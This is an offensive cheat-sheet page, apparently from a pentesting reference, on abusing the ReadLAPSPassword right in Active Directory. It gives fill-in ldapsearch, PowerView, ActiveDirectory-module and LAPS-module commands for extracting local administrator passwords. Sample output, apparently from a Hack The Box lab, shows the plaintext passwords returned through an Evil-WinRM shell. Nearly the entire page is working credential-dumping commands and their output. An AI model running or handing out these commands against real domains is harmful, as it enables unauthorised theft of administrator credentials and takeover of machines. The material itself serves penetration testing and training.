---
title: "ReadLAPSPassword"
date: 2025-7-25
tags: ["Credential Dumping", "Powerview", "ReadLAPSpassword", "Active Directory", "Windows", "LAPS"]
---

### Abuse #1: Read LAPS Password

{{< tab set1 tab1 >}}Linux{{< /tab >}}
{{< tab set1 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console
ldapsearch -H ldap://<TARGET> -b 'DC=<EXAMPLE>,DC=<COM>' -x -D <USER>@<DOMAIN> -w '<PASSWORD>' '(ms-MCS-AdmPwd=*)' ms-MCS-AdmPwd
```

```console {class="sample-code"}
$ ldapsearch -H ldap://10.10.10.240 -b 'DC=LicorDeBellota,DC=HTB' -x -D bob@LicorDeBellota.htb -w 'Test1234!@' '(ms-MCS-AdmPwd=*)' ms-MCS-AdmPwd
# extended LDIF
#
# LDAPv3
# base <DC=LicorDeBellota,DC=HTB> with scope subtree
# filter: (ms-MCS-AdmPwd=*)
# requesting: ms-MCS-AdmPwd 
#

# PIVOTAPI, Domain Controllers, LicorDeBellota.htb
dn: CN=PIVOTAPI,OU=Domain Controllers,DC=LicorDeBellota,DC=htb
ms-Mcs-AdmPwd: 2Vf5kP4Xvj5r605V616x

# search reference
ref: ldap://ForestDnsZones.LicorDeBellota.htb/DC=ForestDnsZones,DC=LicorDeBell
 ota,DC=htb

# search reference
ref: ldap://DomainDnsZones.LicorDeBellota.htb/DC=DomainDnsZones,DC=LicorDeBell
 ota,DC=htb

# search reference
ref: ldap://LicorDeBellota.htb/CN=Configuration,DC=LicorDeBellota,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3
```

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

#### 1. Import PowerView

```console
. .\PowerView.ps1
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\bob\Documents> . .\PowerView.ps1
```

#### 2. Create a Cred Object (Runas) \[Optional\]

```console
$username = '<DOMAIN>\<USER>'
```

```console
$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
```

```console
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
```

#### 3. Read LAPS Password

```console
Get-DomainComputer <TARGET_COMPUTER> -Properties ms-Mcs-AdmPwd
```

```console
# Or activedirectory module
Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\bob\Documents> Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd 


DistinguishedName : CN=PIVOTAPI,OU=Domain Controllers,DC=LicorDeBellota,DC=htb
DNSHostName       : PivotAPI.LicorDeBellota.htb
Enabled           : True
ms-Mcs-AdmPwd     : 2Vf5kP4Xvj5r605V616x
Name              : PIVOTAPI
ObjectClass       : computer
ObjectGUID        : 98783674-e6a3-4d9e-87e3-efe5f31fabbf
SamAccountName    : PIVOTAPI$
SID               : S-1-5-21-842165252-2479896602-2762773115-1004
UserPrincipalName :

```

```console
# Or LAPS module
Get-LapsADPassword -Identity <TARGET_COMPUTER> -AsPlainText
```

```console {class="sample-code"}
PS C:\> Get-LapsADPassword -Identity SRV -AsPlainText
Get-LapsADPassword -Identity SRV -AsPlainText


ComputerName        : SRV
DistinguishedName   : CN=SRV,OU=Servers,DC=example,DC=com
Account             : Administrator
Password            : O5E@-)v$dXU67V
PasswordUpdateTime  : 8/6/2025 2:49:38 AM
ExpirationTimestamp : 9/5/2025 2:49:38 AM
Source              : EncryptedPassword
DecryptionStatus    : Success
AuthorizedDecryptor : TEA\Server Administration
```

{{< /tabcontent >}}
